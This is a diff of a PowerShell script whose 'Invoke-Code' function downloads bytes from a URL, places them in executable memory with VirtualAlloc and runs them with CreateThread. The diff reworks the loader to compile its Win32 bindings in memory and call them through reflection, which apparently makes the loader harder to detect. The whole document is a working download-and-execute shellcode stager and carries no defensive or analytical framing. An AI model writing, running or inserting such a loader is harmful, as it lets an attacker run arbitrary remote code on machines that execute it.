@@ -1,4 +1,5 @@
-$Win32API = @"
+# Define the C# code for the Win32 API functions
+$sourceCode = @"
 using System;
 using System.Runtime.InteropServices;
 
@@ -17,11 +18,27 @@ public class Win32 {
 }
 "@
 
-# Add Win32 API type definition if it doesn't exist
-if (-not ([System.Management.Automation.PSTypeName]"Win32").Type) {
-    Add-Type -TypeDefinition $Win32API
+# Compile the C# code in-memory
+$provider = New-Object Microsoft.CSharp.CSharpCodeProvider
+$params = New-Object System.CodeDom.Compiler.CompilerParameters
+$params.GenerateInMemory = $true
+$params.IncludeDebugInformation = $false
+$params.TreatWarningsAsErrors = $false
+$params.CompilerOptions = "/optimize"
+$params.ReferencedAssemblies.Add("System.dll")
+$params.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll")
+
+$results = $provider.CompileAssemblyFromSource($params, $sourceCode)
+
+if ($results.Errors.HasErrors) {
+    $errors = $results.Errors | ForEach-Object { $_.ToString() }
+    throw "Compilation failed: $($errors -join '; ')"
 }
 
+# Retrieve the compiled assembly
+$assembly = $results.CompiledAssembly
+
+# Define the Invoke-Code function
 function Invoke-Code {
     param(
         [Parameter(Mandatory=$true)]
@@ -37,7 +54,9 @@ function Invoke-Code {
         $code = $webClient.DownloadData($Url)
 
         # Allocate executable memory
-        $memoryAddress = [Win32]::VirtualAlloc([IntPtr]::Zero, [uint32]$code.Length, 0x3000, 0x40)
+        $win32Type = $assembly.GetType("Win32")
+        $virtualAlloc = $win32Type.GetMethod("VirtualAlloc")
+        $memoryAddress = $virtualAlloc.Invoke($null, [IntPtr]::Zero, [uint32]$code.Length, 0x3000, 0x40)
         
         if ($memoryAddress -eq [IntPtr]::Zero) {
             throw "Failed to allocate memory"
@@ -47,14 +66,16 @@ function Invoke-Code {
         [System.Runtime.InteropServices.Marshal]::Copy($code, 0, $memoryAddress, $code.Length)
 
         # Create and execute thread
-        $threadHandle = [Win32]::CreateThread([IntPtr]::Zero, 0, $memoryAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+        $createThread = $win32Type.GetMethod("CreateThread")
+        $threadHandle = $createThread.Invoke($null, [IntPtr]::Zero, 0, $memoryAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
         
         if ($threadHandle -eq [IntPtr]::Zero) {
             throw "Failed to create thread"
         }
 
         # Wait for thread to complete
-        [Win32]::WaitForSingleObject($threadHandle, 0xFFFFFFFF) | Out-Null
+        $waitForSingleObject = $win32Type.GetMethod("WaitForSingleObject")
+        $waitForSingleObject.Invoke($null, $threadHandle, 0xFFFFFFFF) | Out-Null
     }
     catch {
         Write-Error "Error: $_"
@@ -64,4 +85,3 @@ function Invoke-Code {
         [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
     }
 }
-
